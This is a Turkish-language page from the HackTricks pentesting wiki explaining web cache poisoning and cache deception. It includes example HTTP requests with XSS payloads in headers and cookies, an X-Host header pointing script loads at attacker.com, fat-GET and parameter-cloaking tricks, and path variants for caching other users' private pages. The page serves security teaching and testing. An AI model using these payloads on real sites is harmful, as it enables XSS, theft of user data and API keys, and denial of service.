# Cache Poisoning and Cache Deception

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=cache-deception) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

## Fark

> **Web cache poisoning ile web cache deception arasındaki fark nedir?**
>
> * **Web cache poisoning**'de, saldırgan uygulamanın önbelleğe bazı kötü niyetli içerikler depolamasını sağlar ve bu içerik önbellekten diğer uygulama kullanıcılarına sunulur.
> * **Web cache deception**'da, saldırgan uygulamanın başka bir kullanıcıya ait bazı hassas içerikleri önbelleğe depolamasını sağlar ve ardından bu içeriği önbellekten alır.

## Cache Poisoning

Cache poisoning, istemci tarafı önbelleğini manipüle ederek istemcilerin beklenmedik, kısmi veya bir saldırganın kontrolü altındaki kaynakları yüklemeye zorlamayı amaçlar. Etkisi, etkilenen sayfanın popülaritesine bağlıdır, çünkü kirlenmiş yanıt yalnızca önbellek kirlenme süresi boyunca sayfayı ziyaret eden kullanıcılara sunulur.

Cache poisoning saldırısının gerçekleştirilmesi birkaç adım içerir:

1. **Anahtarsız Girdilerin Belirlenmesi**: Bunlar, bir isteğin önbelleğe alınması için gerekli olmasa da, sunucunun döndürdüğü yanıtı değiştirebilen parametrelerdir. Bu girdilerin belirlenmesi, önbelleği manipüle etmek için sömürülebileceğinden kritik öneme sahiptir.
2. **Anahtarsız Girdilerin Sömürülmesi**: Anahtarsız girdiler belirlendikten sonra, bir sonraki adım bu parametreleri saldırgana fayda sağlayacak şekilde sunucunun yanıtını değiştirmek için nasıl kötüye kullanacağınızı bulmaktır.
3. **Kirlenmiş Yanıtın Önbelleğe Alındığının Garantilenmesi**: Son adım, manipüle edilmiş yanıtın önbelleğe kaydedildiğinden emin olmaktır. Bu şekilde, önbellek kirlenmişken etkilenen sayfaya erişen herhangi bir kullanıcı kirlenmiş yanıtı alacaktır.

### Keşif: HTTP başlıklarını kontrol et

Genellikle, bir yanıt **önbelleğe alındığında** bununla ilgili bir **başlık olacaktır**, hangi başlıklara dikkat etmeniz gerektiğini bu yazıda kontrol edebilirsiniz: [**HTTP Cache başlıkları**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Keşif: Önbellek hata kodları

Yanıtın bir önbelleğe kaydedildiğini düşünüyorsanız, **kötü bir başlıkla istek göndermeyi** deneyebilirsiniz, bu da **400 durum kodu** ile yanıtlanmalıdır. Ardından isteği normal bir şekilde erişmeyi deneyin ve eğer **yanıt 400 durum koduysa**, bunun zayıf olduğunu bilirsiniz (ve hatta bir DoS gerçekleştirebilirsiniz).

Daha fazla seçenek bulabilirsiniz:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Ancak, **bazen bu tür durum kodlarının önbelleğe alınmadığını** unutmayın, bu nedenle bu test güvenilir olmayabilir.

### Keşif: Anahtarsız girdileri tanımlayın ve değerlendirin

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanarak **sayfanın yanıtını değiştirebilecek** parametreleri ve başlıkları **kaba kuvvetle denemeyi** deneyebilirsiniz. Örneğin, bir sayfa `X-Forwarded-For` başlığını kullanarak istemcinin buradan script yüklemesini belirtiyor olabilir:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Arka uç sunucudan zararlı bir yanıt elde etme

Parametre/başlık belirlendikten sonra, **nasıl** **temizlendiğini** ve **nerede** **yansıtıldığını** veya başlıktan gelen yanıtı nasıl etkilediğini kontrol edin. Bunu herhangi bir şekilde kötüye kullanabilir misiniz (XSS gerçekleştirmek veya sizin kontrolünüzde bir JS kodu yüklemek? DoS gerçekleştirmek?...)

### Yanıtı önbelleğe al

Kötüye kullanılabilecek **sayfayı** **belirledikten** sonra, hangi **parametre**/**başlık** kullanılacağını ve **nasıl** **kötüye kullanılacağını** belirlemeniz gerekir, sayfayı önbelleğe almanız gerekir. Önbelleğe almak istediğiniz kaynağa bağlı olarak bu biraz zaman alabilir, birkaç saniye boyunca denemek zorunda kalabilirsiniz.

Yanıt içindeki **`X-Cache`** başlığı, isteğin önbelleğe alınmadığında **`miss`** değerine ve önbelleğe alındığında **`hit`** değerine sahip olabileceğinden çok faydalı olabilir.\
**`Cache-Control`** başlığı da bir kaynağın önbelleğe alınıp alınmadığını ve kaynağın bir sonraki ne zaman önbelleğe alınacağını bilmek için ilginçtir: `Cache-Control: public, max-age=1800`

Bir diğer ilginç başlık **`Vary`**. Bu başlık, genellikle **önbellek anahtarı** olarak **işlem gören ek başlıkları** **belirtmek için** kullanılır, normalde anahtarsız olsalar bile. Bu nedenle, hedeflediği kurbanın `User-Agent`'ını bilen bir kullanıcı, o belirli `User-Agent`'ı kullanan kullanıcılar için önbelleği zehirleyebilir.

Önbellek ile ilgili bir başlık daha **`Age`**. Bu, nesnenin proxy önbelleğinde kaç saniye kaldığını tanımlar.

Bir isteği önbelleğe alırken, kullandığınız başlıklarla **dikkatli olun** çünkü bazıları **beklenmedik şekilde** **anahtarlı** olarak **kullanılabilir** ve **kurbanın o aynı başlığı kullanması gerekecektir**. Her zaman **farklı tarayıcılarla** bir Cache Poisoning'i **test edin** ve çalışıp çalışmadığını kontrol edin.

## Sömürü Örnekleri

### En kolay örnek

`X-Forwarded-For` gibi bir başlık, yanıt içinde temizlenmeden yansıtılıyor.\
Temel bir XSS yükü gönderebilir ve önbelleği zehirleyerek sayfaya erişen herkesin XSS olmasını sağlayabilirsiniz:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning to DoS

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Web cache poisoning kullanarak çerez işleme zafiyetlerini istismar etme

Çerezler, bir sayfanın yanıtında da yansıtılabilir. Eğer bunu bir XSS oluşturmak için kötüye kullanabilirseniz, kötü niyetli önbellek yanıtını yükleyen birkaç istemcide XSS'i istismar edebilirsiniz.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Not edin ki, eğer zayıf cookie kullanıcılar tarafından çok kullanılıyorsa, düzenli istekler önbelleği temizleyecektir.

### Ayırıcılar, normalizasyon ve noktalar ile tutarsızlıklar oluşturma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Kontrol et:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### API anahtarını çalmak için yol geçişi ile önbellek zehirleme <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Bu yazı**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi bir URL ile OpenAI API anahtarının nasıl çalındığını açıklıyor çünkü `/share/*` ile eşleşen her şey, Cloudflare URL'yi normalleştirmeden önbelleğe alınacak, bu da isteğin web sunucusuna ulaştığında yapılmıştır.

Bu, daha iyi bir şekilde de açıklanmıştır:

{% content-ref url="cache-poisoning-via-url-discrepancies.md" %}
[cache-poisoning-via-url-discrepancies.md](cache-poisoning-via-url-discrepancies.md)
{% endcontent-ref %}

### Web önbellek zehirleme zayıflıklarını istismar etmek için birden fazla başlık kullanma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir önbelleği istismar edebilmek için **birden fazla anahtarsız girdi** istismar etmeniz gerekecektir. Örneğin, `X-Forwarded-Host` başlığını sizin kontrolünüzdeki bir alan adına ve `X-Forwarded-Scheme` başlığını `http` olarak ayarlarsanız bir **Açık yönlendirme** bulabilirsiniz. **Eğer** **sunucu** tüm **HTTP** isteklerini **HTTPS**'ye **yönlendiriyorsa** ve `X-Forwarded-Scheme` başlığını yönlendirme için alan adı olarak kullanıyorsa, yönlendirme ile sayfanın nereye işaret ettiğini kontrol edebilirsiniz.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sınırlı `Vary` başlığı ile istismar

Eğer **`X-Host`** başlığının **JS kaynağını yüklemek için alan adı** olarak kullanıldığını ancak yanıtın **`Vary`** başlığının **`User-Agent`** belirttiğini bulduysanız, o zaman kurbanın User-Agent'ını dışarı sızdırmanın ve bu kullanıcı ajanını kullanarak önbelleği zehirlemenin bir yolunu bulmalısınız:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

URL'deki ve gövdedeki isteği içeren bir GET isteği gönderin. Eğer web sunucusu gövdedekini kullanıyorsa ama önbellek sunucusu URL'dekini önbelleğe alıyorsa, o URL'ye erişen herkes aslında gövdedeki parametreyi kullanacaktır. James Kettle'ın Github web sitesinde bulduğu zafiyet gibi:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parametre Gizleme

Örneğin, ruby sunucularında **parametreleri** **`&`** yerine **`;`** karakteri kullanarak ayırmak mümkündür. Bu, anahtarsız parametre değerlerini anahtarlı olanların içine yerleştirmek ve bunları kötüye kullanmak için kullanılabilir.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### HTTP İstemci Kaçırma ile HTTP Cache Zehirlemesini Kötüye Kullanma

[HTTP İstemci Kaçırma ile Cache Zehirleme saldırıları nasıl gerçekleştirilir](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) hakkında burada bilgi edinin.

### Web Cache Zehirlemesi için Otomatik Test

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner), web cache zehirlemesi için otomatik test yapmak üzere kullanılabilir. Birçok farklı tekniği destekler ve yüksek derecede özelleştirilebilir.

Örnek kullanım: `wcvs -u example.com`

## Açık Örnekler

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS, URL içindeki parçayı kesmeden iletti ve yalnızca ana bilgisayar, yol ve sorgu kullanarak önbellek anahtarını oluşturdu (parçayı göz ardı ederek). Bu nedenle, `/#/../?r=javascript:alert(1)` isteği arka uca `/#/../?r=javascript:alert(1)` olarak gönderildi ve önbellek anahtarında yük bulunmadı, yalnızca ana bilgisayar, yol ve sorgu vardı.

### GitHub CP-DoS

İçerik türü başlığında kötü bir değer göndermek, 405 önbelleklenmiş yanıtı tetikledi. Önbellek anahtarı çerezi içeriyordu, bu nedenle yalnızca yetkisiz kullanıcıları hedef almak mümkündü.

### GitLab + GCP CP-DoS

GitLab, statik içeriği depolamak için GCP bucket'larını kullanır. **GCP Buckets**, **`x-http-method-override`** başlığını destekler. Bu nedenle, `x-http-method-override: HEAD` başlığını göndermek ve önbelleği boş bir yanıt gövdesi döndürmesi için zehirlemek mümkündü. Ayrıca `PURGE` yöntemini de destekleyebilir.

### Rack Middleware (Ruby on Rails)

Ruby on Rails uygulamalarında, Rack middleware sıklıkla kullanılmaktadır. Rack kodunun amacı, **`x-forwarded-scheme`** başlığının değerini almak ve bunu isteğin şeması olarak ayarlamaktır. `x-forwarded-scheme: http` başlığı gönderildiğinde, aynı konuma 301 yönlendirmesi gerçekleşir ve bu durum, o kaynağa bir Hizmet Reddi (DoS) oluşturabilir. Ayrıca, uygulama `X-forwarded-host` başlığını tanıyabilir ve kullanıcıları belirtilen ana bilgisayara yönlendirebilir. Bu davranış, bir saldırganın sunucusundan JavaScript dosyalarının yüklenmesine yol açarak güvenlik riski oluşturabilir.

### 403 ve Depolama Bucket'ları

Cloudflare daha önce 403 yanıtlarını önbelleğe alıyordu. Yanlış Yetkilendirme başlıkları ile S3 veya Azure Storage Blobs'a erişmeye çalışmak, önbelleğe alınan bir 403 yanıtı ile sonuçlanıyordu. Cloudflare 403 yanıtlarını önbelleğe almayı durdurmuş olsa da, bu davranış diğer proxy hizmetlerinde hala mevcut olabilir.

### Anahtarlı Parametreleri Enjekte Etme

Önbellekler genellikle önbellek anahtarında belirli GET parametrelerini içerir. Örneğin, Fastly'nin Varnish'i isteklerde `size` parametresini önbelleğe alıyordu. Ancak, parametrenin URL kodlamalı bir versiyonu (örneğin, `siz%65`) hatalı bir değerle gönderildiğinde, önbellek anahtarı doğru `size` parametresi kullanılarak oluşturuluyordu. Yine de, arka uç URL kodlamalı parametredeki değeri işliyordu. İkinci `size` parametresinin URL kodlaması, önbellek tarafından atlanmasına ancak arka uç tarafından kullanılmasına yol açtı. Bu parametreye 0 değeri atamak, önbelleğe alınabilir bir 400 Bad Request hatasına neden oldu.

### Kullanıcı Aracı Kuralları

Bazı geliştiriciler, sunucu yükünü yönetmek için FFUF veya Nuclei gibi yüksek trafikli araçların kullanıcı ajanlarıyla eşleşen istekleri engeller. Ironik bir şekilde, bu yaklaşım önbellek zehirlenmesi ve DoS gibi güvenlik açıkları oluşturabilir.

### Geçersiz Başlık Alanları

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230), başlık adlarında kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralığının dışındaki karakterleri içeren başlıkların, ideal olarak 400 Bad Request yanıtı tetiklemesi gerekir. Pratikte, sunucular her zaman bu standarda uymamaktadır. Önemli bir örnek, geçersiz karakterler içeren başlıkları ileten ve `cache-control` başlığı mevcut olmadıkça herhangi bir 400 hatasını önbelleğe alan Akamai'dır. Geçersiz bir karakter içeren bir başlık gönderildiğinde, örneğin `\`, önbelleğe alınabilir bir 400 Bad Request hatası ile sonuçlanan bir sömürülebilir desen tespit edilmiştir.

### Yeni Başlıklar Bulma

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Önbellek Aldatmacası

Önbellek Aldatmacası'nın amacı, istemcilerin **önbellek tarafından kaydedilecek kaynakları hassas bilgileriyle yüklemelerini sağlamaktır**.

Öncelikle, **.css**, **.js**, **.png** gibi **uzantıların** genellikle **önbelleğe** **kaydedilmek** üzere **yapılandırıldığını** unutmayın. Bu nedenle, `www.example.com/profile.php/nonexistent.js` adresine erişirseniz, önbellek muhtemelen yanıtı kaydedecektir çünkü `.js` **uzantısını** görmektedir. Ancak, eğer **uygulama**, _www.example.com/profile.php_ içinde saklanan **hassas** kullanıcı içerikleriyle **tekrar oynuyorsa**, diğer kullanıcılardan bu içerikleri **çalmış** olursunuz.

Test edilecek diğer şeyler:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Daha az bilinen uzantılar kullanın, örneğin_ `.avif`

Bu yazıda çok net bir örnek bulunabilir: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Örnekte, _http://www.example.com/home.php/non-existent.css_ gibi var olmayan bir sayfayı yüklediğinizde, _http://www.example.com/home.php_ (**kullanıcının hassas bilgileriyle**) içeriğin döneceği ve önbellek sunucusunun sonucu kaydedeceği açıklanmaktadır.\
Daha sonra, **saldırgan**, kendi tarayıcısında _http://www.example.com/home.php/non-existent.css_ adresine erişebilir ve daha önce erişen kullanıcıların **gizli bilgilerini** gözlemleyebilir.

**Önbellek proxy'sinin**, dosyaların **uzantısına** (_css_) göre **önbelleğe** **alınacak** şekilde **yapılandırılması** gerektiğini unutmayın ve içerik türüne göre değil. Örneğin, _http://www.example.com/home.php/non-existent.css_ adresinin `text/html` içerik türü yerine `text/css` mime türüne sahip olması beklenmektedir (bu, bir _.css_ dosyası için beklenendir).

[HTTP İstemci Kaçırma ile Cache Aldatmacası saldırıları nasıl gerçekleştirilir](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception) hakkında burada bilgi edinin.

## Otomatik Araçlar

* [**toxicache**](https://github.com/xhzeem/toxicache): Bir URL listesinde web cache zehirlenmesi açıklarını bulmak ve birden fazla enjekte etme tekniğini test etmek için Golang tarayıcı.

## Referanslar

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=cache-deception) kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=cache-deception" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **HackTricks** ve **HackTricks Cloud** github reposuna PR göndererek hacking ipuçlarını paylaşın.

</details>
{% endhint %}
